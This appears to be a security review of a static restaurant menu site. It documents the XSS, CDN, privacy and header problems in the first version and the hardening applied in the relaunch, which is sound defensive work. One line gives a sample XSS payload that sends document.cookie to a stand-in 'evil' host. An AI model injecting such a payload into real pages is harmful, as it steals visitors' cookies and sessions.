# Security review

Scope: the public carte at `etnoteam.io/pastaygofio` (v1) and this relaunch (v2).
There is no server, no login and no database — so the attack surface is the
static site, the data files, and whatever the browser is told to trust.

---

## 1. What was wrong in v1

### 1.1 Cross-site scripting through the menu data — *high*

Every field of `menu.json` was written into the page as **markup**, via jQuery
`.html()`:

```js
categoryHeader = $('<div>').html('<img src="images/' + category.image + '" /> …');
beerDiv.append($('<div class="list">').html(`<b>${itemName}</b> (${quantita}) …`));
spiritDiv.append($('<div class="list">').html(`<b>${spirit.nome}</b> …`));
```

A dish named `<img src=x onerror=fetch('//evil/'+document.cookie)>` executes.
That matters even without an attacker: the file is edited by hand, and anyone
who can change the menu — an FTP password, a hosting-panel account, a
compromised laptop — gets full script execution on the restaurant's domain.

`renderCategory()` also interpolated `category.image` straight into a `src`,
so `../../` traversal or a `javascript:`-style payload was up to the data.

### 1.2 Inline handlers built by string concatenation — *medium*

```js
itemDiv.append(`<p class="extra pointer"><b><a onclick="$('.pizza_${itemCount}').toggle()">…`);
```

`onclick` attributes assembled as strings are the same class of bug, and their
presence is what makes 1.1 unfixable in place: any Content-Security-Policy
strong enough to stop XSS would also break the page, so v1 could not adopt one.

### 1.3 Third-party script with no integrity check — *medium*

```html
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
```

No `integrity` attribute. If that CDN is ever compromised or DNS-hijacked, the
attacker runs arbitrary code on the site. jQuery was used for DOM building and
one AJAX call — about 90 KB of dependency for work the platform does natively.

### 1.4 Google Fonts hotlinked — *privacy / GDPR*

`fonts.googleapis.com` and `fonts.gstatic.com` receive the IP address of every
diner who scans the QR code, with no consent step. German courts (LG München I,
3 O 17493/20) have already found embedding Google Fonts this way unlawful under
the GDPR. For a restaurant serving EU customers this is a real, cheap-to-fix
liability.

### 1.5 Security by obscurity on the daily menu — *low*

```html
<button class="material-icon key" onclick="location.href='/pastaygofio/menu-dia';"></button>
```

A "key" icon that navigates to an unlisted URL is not access control — the link
is in the page source. Anything genuinely private needs server-side auth;
anything not private should not pretend to be.

### 1.6 Missing headers and link hygiene — *low*

No CSP, no `X-Content-Type-Options`, no `Referrer-Policy`, no
`frame-ancestors` — the page could be framed and clickjacked. Several
`target="_blank"` links lacked `rel="noopener"`, letting the opened page
repoint the original tab (reverse tabnabbing).

### 1.7 Unvalidated data crashing the render — *low*

`item.price.amount.toFixed(2)` and friends assume well-formed numbers. One
missing price and the whole category silently disappears mid-render, with no
error anyone would notice until a customer asks why the pizzas are gone.

---

## 2. What v2 does about it

| Risk | Control |
|---|---|
| XSS via data (1.1) | **No `innerHTML` anywhere.** All text goes through `el({text})` in `assets/js/dom.js`, which uses `textContent`. A dish called `<script>…` renders as those literal characters. |
| Injected URLs (1.1) | `safeImage()` accepts a bare filename matching `^[a-z0-9][a-z0-9._-]*\.(svg\|png\|jpe?g\|webp\|avif)$` and rejects `..`; `safeColor()` accepts only hex; `safeId()` only `[a-z0-9-]`. Anything else is dropped, not rendered. |
| Inline handlers (1.2) | Zero inline `onclick`/`<script>`/`<style>`. One delegated listener reads `data-*` attributes. This is what lets the CSP below have no `'unsafe-inline'`. |
| Third-party code (1.3) | **No dependencies at all** — no jQuery, no CDN, no npm packages in the shipped site. Nothing to compromise upstream, nothing to keep patched. |
| Google Fonts (1.4) | Fraunces and Inter are **self-hosted** (`assets/fonts/`, latin + latin-ext only, 260 KB). The app makes zero cross-origin requests, so there is no IP leak and no consent banner needed for fonts. |
| Obscurity (1.5) | Removed. The daily selection is public and derived client-side from the date; there is no fake-private page. If a genuinely private admin view is ever needed it must sit behind server-side auth. |
| Headers (1.6) | Strict CSP in `<meta>` (below) plus real headers in `deploy/headers.conf`, `deploy/apache.htaccess` and `_headers`. Every `target="_blank"` carries `rel="noopener noreferrer"`. |
| Bad data (1.7) | `scripts/validate-data.mjs` runs in CI and **blocks the deploy**: unknown allergen keys, negative or sub-cent prices, duplicate ids, missing translations, dangling pairing references, images that do not exist, "vegan" dishes that declare lactose. |

### The policy

```
default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:;
font-src 'self'; connect-src 'self'; manifest-src 'self'; worker-src 'self';
base-uri 'none'; form-action 'none'; frame-ancestors 'none';
upgrade-insecure-requests
```

`default-src 'none'` means anything not explicitly listed is refused.
`frame-ancestors` is **absent from the `<meta>` tag on purpose** — browsers
ignore that directive when delivered via `<meta>` and log a console error. It is
present in the header files, which is the only place it works.

### Service worker

`sw.js` returns early for any request whose origin is not its own, so a
third-party response can never enter the cache. Menu data is network-first
(a price change reaches diners as soon as they have signal) with the cached copy
as fallback; the shell is cache-first.

### Data stored on the device

`localStorage` holds only `pyg.lang`, `pyg.theme`, `pyg.filters` and `pyg.tray`
— language, theme, allergen filters, and the dishes a diner tapped. No names,
no contact details, no analytics, no cookies, no tracking of any kind. Nothing
is sent anywhere: "Enviar por WhatsApp" opens WhatsApp with a pre-filled
message that the diner sends themselves.

Every read is wrapped in `try/catch` (Safari private mode throws) and
re-validated — quantities are clamped to 1–20, lines to 60, and any saved dish
that no longer exists in the carte is dropped on load.

---

## 3. Residual risks — read this part

1. **GitHub Pages cannot set response headers.** On Pages, only the `<meta>`
   CSP applies, so `frame-ancestors`, `X-Content-Type-Options` and HSTS are
   missing. The site is public and read-only, so the practical impact is
   framing/clickjacking of a menu — low. Serving from your own nginx/Apache with
   `deploy/headers.conf` closes it completely.
2. **Whoever can push to this repository can change prices and allergens.**
   That is now the main risk, and it is an access-control problem, not a code
   one. Enable branch protection on the default branch and require 2FA for every
   account with write access.
3. **Allergen data is a safety claim, not decoration.** The filter hides dishes
   based on what `menu.json` declares. The UI says so in all four languages, but
   the data must be kept accurate by the kitchen. The validator checks the keys
   are *valid*, and cannot check they are *true*.

   Related, and worth stating plainly: "gluten free" is only ever inferred from
   a **non-empty** allergen list. A dish with no allergens recorded is treated
   as *unknown*, not as safe — it gets no "sin gluten" badge and is excluded
   from the gluten-free filter. The previous carte had two dishes with no
   allergens declared at all; under a naive rule both would have been advertised
   to coeliac diners as safe.
4. **`upgrade-insecure-requests` is not HSTS.** Terminate TLS properly and serve
   `Strict-Transport-Security` at the edge.

## Reporting

Found something? Open a private security advisory on this repository, or write
to the restaurant directly — do not open a public issue with details.
